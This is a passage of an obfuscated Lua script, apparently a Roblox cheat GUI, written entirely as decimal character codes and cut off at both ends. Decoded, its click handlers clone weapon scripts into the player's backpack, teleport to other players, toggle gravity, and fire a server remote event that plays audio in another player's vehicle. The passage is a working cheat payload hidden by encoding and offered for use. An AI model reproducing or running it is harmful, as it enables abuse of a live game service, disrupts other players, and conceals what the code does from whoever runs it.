66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\83','\110','\105','\112','\101','\114','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\82','\105','\102','\108','\101','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\74','\70','\66','\85','\56','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\89','\80','\70','\83','\56','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\118','\41','\108','\111','\99','\97','\108','\32','\97','\54','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\54','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\83','\80','\65','\83','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\83','\104','\111','\116','\103','\117','\110','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\89','\80','\70','\83','\56','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\85','\76','\71','\70','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\119','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\76','\97','\115','\101','\114','\32','\66','\101','\97','\109','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\85','\76','\71','\70','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\87','\89','\69','\78','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\120','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\70','\105','\114','\101','\32','\66','\97','\108','\108','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\87','\89','\69','\78','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\83','\74','\71','\71','\56','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\121','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\68','\97','\114','\107','\32','\69','\110','\101','\114','\103','\121','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\83','\74','\71','\71','\56','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\69','\84','\67','\69','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\122','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\80','\104','\97','\110','\116','\111','\109','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\69','\84','\67','\69','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\78','\81','\71','\82','\55','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\65','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\69','\108','\101','\99','\116','\114','\105','\99','\105','\116','\121','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\78','\81','\71','\82','\55','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\67','\80','\84','\85','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\66','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\70','\114','\111','\115','\116','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\111','\119','\101','\114','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\67','\80','\84','\85','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\84','\89','\88','\73','\57','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\67','\41','\108','\111','\99','\97','\108','\32','\97','\54','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\54','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\65','\75','\52','\55','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\82','\105','\102','\108','\101','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\84','\89','\88','\73','\57','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\81','\86','\71','\78','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\68','\41','\108','\111','\99','\97','\108','\32','\97','\55','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\55','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\71','\114','\101','\110','\97','\100','\101','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\71','\114','\101','\110','\97','\100','\101','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\49','\48','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\81','\86','\71','\78','\56','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\71','\66','\70','\88','\56','\53','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\72','\41','\108','\111','\99','\97','\108','\32','\72','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\72','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\97','\56','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\58','\70','\105','\110','\100','\70','\105','\114','\115','\116','\67','\104','\105','\108','\100','\40','\72','\46','\80','\97','\114','\101','\110','\116','\46','\116','\112','\66','\79','\88','\46','\84','\101','\120','\116','\41','\108','\111','\99','\97','\108','\32','\97','\57','\61','\97','\56','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\59','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\97','\57','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\71','\66','\70','\88','\56','\53','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\77','\72','\88','\89','\55','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\74','\41','\108','\111','\99','\97','\108','\32','\97','\97','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\103','\114','\61','\116','\114','\117','\101','\59','\97','\97','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\105','\102','\32','\103','\114','\61','\61','\116','\114','\117','\101','\32','\116','\104','\101','\110','\32','\103','\114','\61','\102','\97','\108','\115','\101','\59','\103','\97','\109','\101','\46','\119','\111','\114','\107','\115','\112','\97','\99','\101','\46','\71','\114','\97','\118','\105','\116','\121','\61','\49','\57','\53','\59','\97','\97','\46','\84','\101','\120','\116','\61','\34','\71','\114','\97','\118','\105','\116','\121','\58','\32','\79','\70','\70','\34','\101','\108','\115','\101','\32','\103','\114','\61','\116','\114','\117','\101','\59','\103','\97','\109','\101','\46','\119','\111','\114','\107','\115','\112','\97','\99','\101','\46','\71','\114','\97','\118','\105','\116','\121','\61','\52','\53','\59','\97','\97','\46','\84','\101','\120','\116','\61','\34','\71','\114','\97','\118','\105','\116','\121','\58','\32','\79','\78','\34','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\77','\72','\88','\89','\55','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\89','\76','\65','\80','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\76','\41','\108','\111','\99','\97','\108','\32','\97','\98','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\98','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\78','\97','\109','\101','\61','\34','\110','\105','\99','\49','\48','\116','\101','\108','\102','\34','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\101','\97','\100','\58','\68','\101','\115','\116','\114','\111','\121','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\104','\97','\110','\103','\101','\100','\58','\99','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\78','\97','\109','\101','\61','\34','\110','\105','\99','\49','\48','\116','\101','\108','\102','\34','\112','\114','\105','\110','\116','\40','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\78','\97','\109','\101','\41','\101','\110','\100','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\89','\76','\65','\80','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\89','\66','\79','\77','\54','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\78','\41','\108','\111','\99','\97','\108','\32','\78','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\78','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\97','\99','\61','\78','\46','\80','\97','\114','\101','\110','\116','\46','\97','\117','\100','\105','\111','\66','\79','\88','\46','\84','\101','\120','\116','\59','\108','\111','\99','\97','\108','\32','\97','\100','\61','\103','\97','\109','\101','\58','\71','\101','\116','\83','\101','\114','\118','\105','\99','\101','\40','\34','\80','\108','\97','\121','\101','\114','\115','\34','\41','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\59','\108','\111','\99','\97','\108','\32','\97','\101','\61','\103','\97','\109','\101','\58','\71','\101','\116','\83','\101','\114','\118','\105','\99','\101','\40','\34','\82','\101','\112','\108','\105','\99','\97','\116','\101','\100','\83','\116','\111','\114','\97','\103','\101','\34','\41','\46','\69','\118','\101','\110','\116','\59','\97','\101','\58','\70','\105','\114','\101','\83','\101','\114','\118','\101','\114','\40','\34','\80','\108','\97','\121','\82','\97','\100','\105','\111','\34','\44','\119','\111','\114','\107','\115','\112','\97','\99','\101','\46','\79','\98','\106','\101','\99','\116','\83','\101','\108','\101','\99','\116','\105','\111','\110','\91','\97','\100','\46','\78','\97','\109','\101','\46','\46','\34','\39','\115','\32','\86','\101','\104','\105','\99','\108','\101','\34','\93','\46','\67','\104','\97','\115','\115','\105','\115','\44','\97','\99','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\89','\66','\79','\77','\54','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\76','\81','\77','\84','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\79','\41','\108','\111','\99','\97','\108','\32','\97','\98','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\98','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\97','\102','\61','\123','\53','\50','\55','\53','\52','\48','\52','\44','\53','\50','\55','\53','\52','\48','\54','\44','\53','\50','\55','\53','\52','\48','\56','\44','\53','\50','\56','\51','\56','\56','\51','\44','\53','\50','\56','\53','\57','\52','\53','\44','\53','\55','\56','\54','\57','\53','\48','\44','\53','\57','\52','\53','\53','\54','\54','\44','\53','\57','\56','\49','\56','\54','\56','\125','\102','\111','\114','\32','\